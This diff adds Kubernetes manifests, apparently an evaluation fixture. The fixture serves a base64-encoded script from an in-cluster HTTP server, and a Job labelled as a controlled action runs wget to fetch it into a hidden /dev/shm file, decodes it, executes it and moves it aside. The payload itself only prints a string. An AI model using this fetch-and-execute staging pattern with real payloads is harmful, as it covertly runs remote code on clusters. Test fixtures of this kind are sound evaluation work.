@@ -1,0 +1,88 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: controlled-payload
+data:
+  payload.b64: IyEvYmluL3NoCnByaW50ZiAiY29udHJvbGxlZC1wYXlsb2FkXG4iCg==
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: payload-server
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: payload-server
+  template:
+    metadata:
+      labels:
+        app: payload-server
+    spec:
+      containers:
+        - name: server
+          image: python:3.12-alpine
+          command:
+            - python3
+            - '-m'
+            - http.server
+            - '8080'
+            - '--directory'
+            - /payload
+          ports:
+            - name: http
+              containerPort: 8080
+          volumeMounts:
+            - name: payload
+              mountPath: /payload
+      volumes:
+        - name: payload
+          configMap:
+            name: controlled-payload
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: payload-server
+spec:
+  selector:
+    app: payload-server
+  ports:
+    - name: action
+      port: 8080
+      targetPort: 8080
+  type: ClusterIP
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: payload-stager
+  labels:
+    evals.kubernetes.io/controlled-action: payload-stager
+spec:
+  backoffLimit: 1
+  template:
+    metadata:
+      labels:
+        app: payload-stager
+    spec:
+      restartPolicy: Never
+      volumes:
+        - name: controlled-bin
+          emptyDir: {}
+      containers:
+        - name: action
+          image: alpine:3.20
+          command:
+            - /bin/sh
+            - '-ceu'
+            - |-
+              wget -qO /dev/shm/.payload.b64 http://payload-server:8080/payload.b64
+              base64 -d /dev/shm/.payload.b64 > /dev/shm/.payload
+              chmod 0700 /dev/shm/.payload
+              /dev/shm/.payload
+              mkdir -p /controlled-bin/tools
+              mv /dev/shm/.payload /controlled-bin/tools/controlled-payload
+          volumeMounts:
+            - name: controlled-bin
+              mountPath: /controlled-bin
